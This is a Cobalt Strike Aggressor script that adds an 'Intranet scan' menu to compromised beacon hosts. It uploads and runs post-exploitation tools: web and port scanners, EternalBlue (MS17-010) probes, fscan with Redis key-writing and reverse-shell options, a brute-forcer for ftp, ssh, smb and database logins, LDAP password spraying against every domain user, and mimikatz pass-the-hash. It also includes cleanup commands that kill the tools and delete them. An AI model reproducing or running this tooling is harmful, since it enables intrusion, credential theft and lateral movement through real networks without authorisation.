menu "Intranet scan" {
  item "SharpWebScan(Probe web service)" {
    $bid = $1['@'];
    $dialog = dialog("SharpWebScan", %(iptype => "-IP",ip => beacon_info($bid,"internal"),port => "80,443,7001,8000,8001,8080,8888",bid => $bid), &SharpWebScan);
    dialog_description($dialog, "Scan the web service of IP or C segment, get Title, customize multi-port scan, return web address and title. project address：https://github.com/RcoIl/CSharp-Tools/tree/master/SharpWebScan");
    drow_text($dialog, "ip", "ip:  ");
    drow_text($dialog, "port", "ports:  ");
    drow_combobox($dialog, "iptype", "-ip/-cip", @("-IP", "-CIP"));
    dbutton_action($dialog, "run");
    dialog_show($dialog);
  }
  sub SharpWebScan {
    $arg = join(' ', @($3['iptype'],$3['ip'],$3['port']));
    bexecute_assembly($bid, script_resource("/scripts/Intranet scanning/SharpWebScan.exe"), $arg);
  }

  menu "TailorScan(Stitching Monster Intranet Scanner)" {
    item "Upload TailorScan" {
      $bid = $1;
      $dialog = dialog("Upload TailorScan", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &TailorScan);
      dialog_description($dialog, "Support port scanning, identification service, get title, scan multiple network cards, ms17010 scan, icmp survival detection. project address：https://github.com/uknowsec/TailorScan");
      drow_text($dialog, "UploadPath",  "Upload path: ");
      dbutton_action($dialog, "Upload");
      dialog_show($dialog);
    }
    sub TailorScan {
      bcd($bid, $3['UploadPath']);
      if (-is64 $bid['id']) {
        bupload($bid, script_resource("/scripts/Intranet scanning/x64/TailorScan.exe"));
      }else{
        bupload($bid, script_resource("/scripts/Intranet scanning/x86/TailorScan.exe"));
      }
    }
    item "Run TailorScan"{
			$bid = $1['@'];
      btask($bid, " ", "");
      btask($bid, "TailorScan.exe", "");
      btask($bid, " ", "");
      btask($bid, "Scan IP format support：", "");
      btask($bid, "   192.168.1.1", "");
      btask($bid, "   192.168.1.1-10", "");
      btask($bid, "   192.168.1.*", "");
      btask($bid, "   192.168.1.0/24", "");
      btask($bid, " ", "");
      btask($bid, "Port supports custom list, use ',' Separated like：", "");
      btask($bid, "   21,22,80-99,8000-8080", "");
      btask($bid, " ", "");
      btask($bid, "Port scan，Support tcp, icmp:", "");
      btask($bid, "   TailorScan.exe portscan 192.168.0.1/24 80,8080 tcp", "");
      btask($bid, "   TailorScan.exe portscan 192.168.0.1/24 tcp", "");
      btask($bid, " ", "");
      btask($bid, "Eternal Blue Probe：", "");
      btask($bid, "   TailorScan.exe ms17010 -i 192.168.0.1", "");
      btask($bid, "   TailorScan.exe ms17010 -n 192.168.0.1/24", "");
      btask($bid, " ", "");
      btask($bid, "OXID Find：", "");
      btask($bid, "   TailorScan.exe oxidfind -i 192.168.0.1", "");
      btask($bid, "   TailorScan.exe oxidfind -n 192.168.0.1/24", "");
      btask($bid, " ", "");
      btask($bid, "ICMP check：", "");
      btask($bid, "   TailorScan.exe icmpcheck 192.168.0.1/24", "");
      btask($bid, " ", "");
			$dialog = dialog("Run TailorScan",%(exec => "TailorScan.exe ms17010 -n 192.168.0.1/24", bid => $bid),&TailorScan_run);
			dialog_description($dialog, "Pay attention to the instructions for the console output, Enter the execution command directly below：");
      drow_text($dialog, "exec", "Exec: ");
			dbutton_action($dialog, "run");
			dialog_show($dialog);
		}
		sub TailorScan_run{
      $exec = $3['exec'];
			bshell($bid, "$exec");
		}
    item "Remove TailorScan"{
			$bid = $1['@'];
      bshell($bid, "taskkill -f /im TailorScan.exe & del /f /s /q TailorScan.exe");
    }
  }

  menu "fscan" {
    item "Upload fscan" {
      $bid = $1;
      $dialog = dialog("Upload fscan", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &fscan);
      dialog_description($dialog, "After testing, if 360 will be killed, it supports host survival detection, port scanning, blasting of common services, ms17010, redis batch write private key, scheduled task rebound shell, read win network card information, etc. project address：https://github.com/shadow1ng/fscan");
      drow_text($dialog, "UploadPath",  "Upload path: ");
      dbutton_action($dialog, "Upload");
      dialog_show($dialog);
    }
    sub fscan {
      bcd($bid, $3['UploadPath']);
      bupload($bid, script_resource("/scripts/Intranet scanning/fscan.exe"));
    }
    item "Run fscan"{
			$bid = $1['@'];
      btask($bid, "Simple usage：", "");
      btask($bid, "fscan.exe -h 192.168.1.1/24                      (Use all modules by default)", "");
      btask($bid, "fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub       (redis Write private key)", "");
      btask($bid, "fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis Scheduled task reverse shell)", "");
      btask($bid, "fscan.exe -h 192.168.1.1/24 -c whoami            (ssh After successful blasting, the command is executed)", "");
      btask($bid, "fscan.exe -h 192.168.1.1/24 -m ssh -p 2222       (Specify module ssh and port)", "");
      btask($bid, "fscan.exe -h 192.168.1.1/24 -m ms17010           (Designated module)", "");
      btask($bid, " ", "");
      btask($bid, "-h 192.168.1.1/24 (Segment C)", "");
      btask($bid, "-h 192.168.1.1/16 (Segment B)", "");
      btask($bid, "-h 192.168.1.1/8  (192.x.x.1 and 192.x.x.254 in the A segment, which is convenient to quickly view the network segment information)", "");
      btask($bid, "-hf ip.txt        (Import as file)", "");
      btask($bid, " ", "");
      btask($bid, "fscan.exe -h      (See the complete usage)", "");
      btask($bid, " ", "");
      $dialog = dialog("Run fscan",%(exec => "fscan.exe -h 192.168.1.1/24", bid => $bid),&fscan_run);
			dialog_description($dialog, "Pay attention to the instructions on the console output and enter the execution instructions directly below：");
      drow_text($dialog, "exec", "Exec: ");
			dbutton_action($dialog, "run");
			dialog_show($dialog);
		}
    sub fscan_run{
      $exec = $3['exec'];
			bshell($bid, "$exec");
		}
    item "Remove fscan"{
			$bid = $1['@'];
      bshell($bid, "taskkill -f /im fscan.exe & del /f /s /q fscan.exe");
    }
  }


  menu "crack blasting" {
    item "Upload crack" {
      $bid = $1;
      $dialog = dialog("Upload crack", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &crack);
      dialog_description($Dialog, "Support blasting ftp，ssh，smb，mssql，mysql, postgresql, After blasting, it will be generated in the current directoryresult.txt. fork address：https://github.com/oksbsb/crack");
      drow_text($dialog, "UploadPath",  "Upload path: ");
      dbutton_action($dialog, "Upload");
      dialog_show($dialog);
    }
    sub crack {
      bcd($bid, $3['UploadPath']);
      bupload($bid, script_resource("/scripts/Intranet scanning/crack.exe"));
    }
    item "Run crack"{
      $bid = $1['@'];
      btask($bid, " ", "");
      btask($bid, "-i string", "");
      btask($bid, "   ip addr 192.168.1.1/24，192.168.1-255，192.168.1.1", "");
      btask($bid, "-p string", "");
      btask($bid, "   port 21,22，445，3306，1433", "");
      btask($bid, "-U string", "");
      btask($bid, "   filename list or username", "");
      btask($bid, "-P string", "");
      btask($bid, "   filename list or username", "");
      btask($bid, "-s string", "");
      btask($bid, "   service ftp  ssh，smb，mssql，mysql, postgresql   default  only scan tcp port (default \"scan\")", "");
      btask($bid, "-t int", "");
      btask($bid, "   thread (default 100)", "");
      btask($bid, " ", "");
      $Dialog = dialog("Run crack",%(ip => "192.168.1.1/24", port => "445", username => "filename list or username", password => "filename list or password", type => "smb", thread => "100",bid => $bid),&crack_run);
      dialog_description($Dialog, "Support blasting ftp，ssh，smb，mssql，mysql, postgresql, After blasting, it will be generated in the current directory result.txt。");
      drow_text($Dialog, "ip", "ip: ");
      drow_text($Dialog, "port", "port: ");
      drow_text($Dialog, "username", "username: ");
      drow_text($Dialog, "password", "password: ");
      drow_text($Dialog, "type", "type: ");
      drow_text($Dialog, "thread", "thread: ");
      dbutton_action($Dialog, "run");
      dialog_show($Dialog);
    }
    sub crack_run{
      local('$Name $port $username $password $type $thread');
      $Name = $3['ip'];
      $port = replace($3['port'], "\"", "");
      $username = $3['username'];
      $password = $3['password'];
      $type = $3['type'];
      $thread = $3['thread'];
      bshell($bid, "crack.exe -i  $+ $Name -p  $+ $port -U  $+ $username -P  $+ $password -s  $+ $type -t  $+ $thread");
    }
    item "Delete crack"{
      local('$bid');
      foreach $bid ($1){
        bshell($1, "taskkill -f /im crack.exe & del /f /s /q crack.exe");
      }
    }
  }

  item "SharpSpray(Domain password blasting)" {
    $bid = $1['@'];
    $dialog = dialog("SharpSpray", %(passwd => "123,888",Delay => "1000",Sleep => "1",bid => $bid), &SharpSpray);
    dialog_description($dialog, "Use LDAP to perform a password spray attack on all users of the domain. seeds：Specify several passwords to generate a dictionary, separated by commas. passwords：Specify password blasting, multiple passwords are allowed, separated by commas. delay：The delay of password spray, in milliseconds. sleep: The number of minutes of sleep period between password guesses. project address：https://github.com/jnqpblc/SharpSpray");
    drow_combobox($dialog, "type", "type:", @("--Seeds","--Passwords"));
    drow_text($dialog, "passwd", "passwd:  ");
    drow_text($dialog, "Delay", "Delay:  ");
    drow_text($dialog, "Sleep", "Sleep:  ");
    dbutton_action($dialog, "run");
    dialog_show($dialog);
  }
  sub SharpSpray {
    $arg = join(' ',  @($3['type'],$3['passwd'],"--Sleep",$3['Sleep'],"--Delay",$3['Delay']));
    bexecute_assembly($bid, script_resource("/scripts/Intranet scanning/SharpSpray.exe"), $arg);
  }

  item "Mimikatz-pth"{
    local('$bid');
    foreach $bid ($1){
      mimikatz_passthehash($bid);
    }
  }
  sub mimikatz_passthehash{
  	$bid = $1;
  	$dialog = dialog("Pass-The-Hash" , %(beacon => $1 , domain => "xxx.com" , user => "administrator" , hash => "hash") , lambda({
      bpassthehash($3["beacon"] , $3["domain"] , $3["user"] , $3["hash"]);
  	}));
  	dialog_description($dialog, "mimikatz Pass-The-Hash attack.");
  	drow_text($dialog, "beacon",  "Beacon:");
  	drow_text($dialog, "domain",  "Domain:");
  	drow_text($dialog, "user",  "User:");
  	drow_text($dialog, "hash",  "Hash:");
  	dbutton_action($dialog, "Launch");
  	dialog_show($dialog);
  }

}
